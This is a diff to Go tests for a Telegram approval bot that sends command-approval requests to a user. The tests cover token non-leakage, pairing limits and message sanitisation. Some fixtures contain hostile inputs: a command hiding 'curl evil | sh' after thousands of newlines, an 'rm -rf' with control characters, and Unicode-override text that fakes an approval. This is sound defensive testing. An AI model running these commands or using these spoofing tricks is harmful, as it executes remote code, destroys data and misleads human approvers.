@@ -3,6 +3,7 @@ package telegram
 import (
 	"context"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net/http"
@@ -15,7 +16,7 @@ import (
 	"github.com/ASromancer/ostiary/internal/approval"
 )
 
-const tok = "123:SECRET"
+const tok = "123456:ABCdefGHIjklMNOpqrSTUvwxYZ0123456789"
 
 type call struct {
 	Method string
@@ -127,7 +128,7 @@ type env struct {
 func newEnv(t *testing.T, chat, user int64, allow bool) *env {
 	e := &env{f: newFake(t), pending: map[int]bool{}}
 	e.s = New(Options{Bot: e.f.bot(), ChatID: chat, UserID: user, AllowDestructive: allow,
-		Resolve: func(id int, c string) error {
+		Resolve: func(id int, c string, user int64) error {
 			e.mu.Lock()
 			defer e.mu.Unlock()
 			if !e.pending[id] {
@@ -157,13 +158,17 @@ func (e *env) got() []string {
 }
 
 func pairMsg(chatType string, chat, user int64, text string) Update {
-	return Update{UpdateID: 1, Message: &Message{Chat: Chat{ID: chat, Type: chatType}, From: &User{ID: user}, Text: text}}
+	return Update{UpdateID: 1, Message: &Message{Chat: Chat{ID: chat, Type: chatType}, From: &User{ID: user}, Text: text, Date: time.Now().Unix()}}
 }
 
 func TestGetMeBadToken(t *testing.T) {
 	f := newFake(t)
 	_, err := (&Bot{Token: "bad", Base: f.srv.URL}).GetMe(context.Background())
-	if err == nil || !strings.Contains(err.Error(), "không hợp lệ") || strings.Contains(err.Error(), "bad:") {
+	if err == nil || !strings.Contains(err.Error(), "không hợp lệ") {
+		t.Fatal(err)
+	}
+	_, err = (&Bot{Token: "999:" + strings.Repeat("x", 35), Base: f.srv.URL}).GetMe(context.Background())
+	if err == nil || !strings.Contains(err.Error(), "Unauthorized") {
 		t.Fatal(err)
 	}
 	name, err := f.bot().GetMe(context.Background())
@@ -172,11 +177,46 @@ func TestGetMeBadToken(t *testing.T) {
 	}
 }
 
+type failRT struct{}
+
+// A transport whose error text carries the whole request URL, like net/http's own.
+func (failRT) RoundTrip(r *http.Request) (*http.Response, error) {
+	return nil, fmt.Errorf("dial failed for %s", r.URL)
+}
+
+func noLeak(t *testing.T, token string, err error) {
+	t.Helper()
+	if err == nil {
+		t.Fatal("expected an error")
+	}
+	for i := 0; i+10 <= len(token); i++ {
+		if strings.Contains(err.Error(), token[i:i+10]) {
+			t.Fatalf("error leaks the token: %v", err)
+		}
+	}
+}
+
 func TestErrorsNeverContainToken(t *testing.T) {
-	b := &Bot{Token: tok, Base: "http://127.0.0.1:1"}
-	_, err := b.GetMe(context.Background())
-	if err == nil || strings.Contains(err.Error(), "SECRET") {
-		t.Fatal(err)
+	base := "123456:ABCdefGHIjklMNOpqrSTUvwxYZ0123456789"
+	for _, token := range []string{base, base + "\n", " " + base, base + `"`, base + " x", "\t" + base} {
+		for _, b := range []*Bot{
+			{Token: token, Base: "http://127.0.0.1:1"},
+			{Token: token, Base: "http://127.0.0.1:1", HTTP: &http.Client{Transport: failRT{}}},
+		} {
+			_, err := b.GetMe(context.Background())
+			noLeak(t, token, err)
+		}
+	}
+}
+
+func TestValidToken(t *testing.T) {
+	if v, err := ValidToken(" \n" + tok + "\n"); err != nil || v != tok {
+		t.Fatal(v, err)
+	}
+	for _, bad := range []string{"", "abc", "123:short", tok + "\n x", "x" + tok} {
+		if _, err := ValidToken(bad); err == nil {
+			t.Fatalf("%q accepted", bad)
+		}
 	}
 }
 
@@ -214,13 +254,13 @@ func TestPairingWrongCodesEndAfterFive(t *testing.T) {
 	e := newEnv(t, 0, 0, true)
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
-	for i := 0; i < 5; i++ {
+	for i := 0; i < 10; i++ {
 		u := pairMsg("private", 7, 7, "/pair 000000")
 		u.UpdateID = i + 1
 		e.f.push(u)
 	}
 	_, _, err := e.s.Pair(ctx, "123456")
-	if err == nil || !strings.Contains(err.Error(), "5 lần") {
+	if err == nil || !strings.Contains(err.Error(), "10 lần") {
 		t.Fatal(err)
 	}
 	if e.s.Status().Pairing || e.s.Status().Paired {
@@ -328,6 +368,15 @@ func nonce(t *testing.T, e *env, id int) string {
 		t.Fatal("no message")
 	}
 	d := buttons(m)[0]["callback_data"].(string)
+	for i := 0; i < 400; i++ { // callbacks need the message id the daemon learns from the reply
+		e.s.mu.Lock()
+		ok := e.s.sent[id] != nil && e.s.sent[id].msgID != 0
+		e.s.mu.Unlock()
+		if ok {
+			break
+		}
+		time.Sleep(5 * time.Millisecond)
+	}
 	return strings.Split(d, ":")[2]
 }
 
@@ -447,7 +496,7 @@ func TestPollErrorsBackOffAndRecord(t *testing.T) {
 		time.Sleep(5 * time.Millisecond)
 	}
 	st := e.s.Status()
-	if !strings.Contains(st.LastError, "không kết nối được") || strings.Contains(st.LastError, "SECRET") {
+	if !strings.Contains(st.LastError, "không kết nối được") || strings.Contains(st.LastError, "ABCdefGHIj") {
 		t.Fatal(st.LastError)
 	}
 	e.f.mu.Lock()
@@ -458,5 +507,119 @@ func TestPollErrorsBackOffAndRecord(t *testing.T) {
 	}
 	if e.s.Status().LastError != "" {
 		t.Fatal("error not cleared after recovery")
+	}
+}
+
+func TestPairingIgnoresOldBacklog(t *testing.T) {
+	e := newEnv(t, 0, 0, true)
+	p := e.s.BeginPairing("444444")
+	old := pairMsg("private", 7, 7, "/pair 000000")
+	old.Message.Date = time.Now().Add(-time.Hour).Unix()
+	for i := 0; i < 12; i++ {
+		old.UpdateID = i + 1
+		e.f.push(old)
+	}
+	time.Sleep(100 * time.Millisecond)
+	if !e.s.Status().Pairing {
+		t.Fatal("old messages burned the attempts")
+	}
+	good := pairMsg("private", 7, 7, "/pair 444444")
+	good.UpdateID = 99
+	good.Message.From.Username = "alice"
+	e.f.push(good)
+	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
+	defer cancel()
+	if _, _, err := p.Result(ctx); err != nil || e.s.Status().User != "alice" {
+		t.Fatal(err)
+	}
+}
+
+func TestPairingExpiryShownWithoutMessage(t *testing.T) {
+	e := newEnv(t, 0, 0, true)
+	now := time.Now()
+	e.s.mu.Lock()
+	e.s.Now = func() time.Time { return now }
+	e.s.mu.Unlock()
+	e.s.BeginPairing("555555")
+	if !e.s.Status().Pairing {
+		t.Fatal("not pairing")
+	}
+	now = now.Add(11 * time.Minute)
+	st := e.s.Status()
+	if st.Pairing || !strings.Contains(st.LastError, "hết hạn") {
+		t.Fatalf("%+v", st)
+	}
+	// the expiry error survives good polls
+	time.Sleep(50 * time.Millisecond)
+	if !strings.Contains(e.s.Status().LastError, "hết hạn") {
+		t.Fatal("error erased by a good poll")
+	}
+}
+
+func TestTruncatedCommandOffersOnlyDeny(t *testing.T) {
+	e := newEnv(t, 7, 7, true)
+	e.pending[4] = true
+	r := req(4, "mutate")
+	r.Cmd = "echo ok" + strings.Repeat("\n", 3500) + "; curl evil | sh"
+	e.s.Notify(r)
+	m := e.f.find("sendMessage", 0)
+	b := buttons(m)
+	txt := m.Body["text"].(string)
+	if len(b) != 1 || !strings.Contains(b[0]["callback_data"].(string), ":n:") ||
+		!strings.Contains(txt, "Lệnh dài, đã cắt") || strings.Index(txt, "Lệnh dài") < strings.Index(txt, "</pre>") {
+		t.Fatalf("%v %s", b, txt)
+	}
+	n := nonce(t, e, 4)
+	e.f.push(cbUpdate(1, 7, 7, "4:y:"+n))
+	if a := answerText(t, e, 0); a != "không hợp lệ" || len(e.got()) != 0 {
+		t.Fatal(a)
+	}
+}
+
+func TestCallbackMustMatchMessageID(t *testing.T) {
+	e := newEnv(t, 7, 7, true)
+	e.pending[4] = true
+	e.s.Notify(req(4, "mutate"))
+	n := nonce(t, e, 4)
+	u := cbUpdate(1, 7, 7, "4:y:"+n)
+	u.Callback.Message.MessageID = 999 // a lookalike message
+	e.f.push(u)
+	if a := answerText(t, e, 0); a != "không hợp lệ" || len(e.got()) != 0 {
+		t.Fatal(a)
+	}
+}
+
+func TestMessageSanitized(t *testing.T) {
+	e := newEnv(t, 7, 7, true)
+	r := req(1, "mutate")
+	r.Agent = "evil\n✅ Đã duyệt bởi bạn\u202e" + strings.Repeat("A", 500)
+	r.Repo = "/x/pr\u200boj\nx"
+	r.Host = strings.Repeat("h", 500)
+	r.Cmd = "ls \u202e;rm\r\x01 -rf"
+	e.s.Notify(r)
+	txt := e.f.find("sendMessage", 0).Body["text"].(string)
+	if strings.ContainsRune(txt, '\u202e') || strings.ContainsRune(txt, '\u200b') || strings.Contains(txt, "\n✅ Đã duyệt") ||
+		!strings.Contains(txt, "⟦U+202E⟧") || !strings.Contains(txt, "⟦U+000D⟧") || !strings.Contains(txt, "⟦U+0001⟧") ||
+		!strings.Contains(txt, "Dự án: proj x") || utf16len(txt) > 4096 {
+		t.Fatal(txt)
+	}
+	if strings.Count(txt, "A") > 90 || strings.Count(txt, "h") > 100 {
+		t.Fatal("fields not capped")
+	}
+}
+
+func TestSingleFailureNotShown(t *testing.T) {
+	e := newEnv(t, 7, 7, true)
+	e.s.pollResult(errors.New("x"))
+	if e.s.Status().LastError != "" {
+		t.Fatal("one failure shown")
+	}
+	e.s.pollResult(errors.New("x"))
+	if e.s.Status().LastError == "" {
+		t.Fatal("two failures not shown")
+	}
+	e.s.pollResult(nil)
+	if e.s.Status().LastError != "" {
+		t.Fatal("not cleared")
 	}
 }
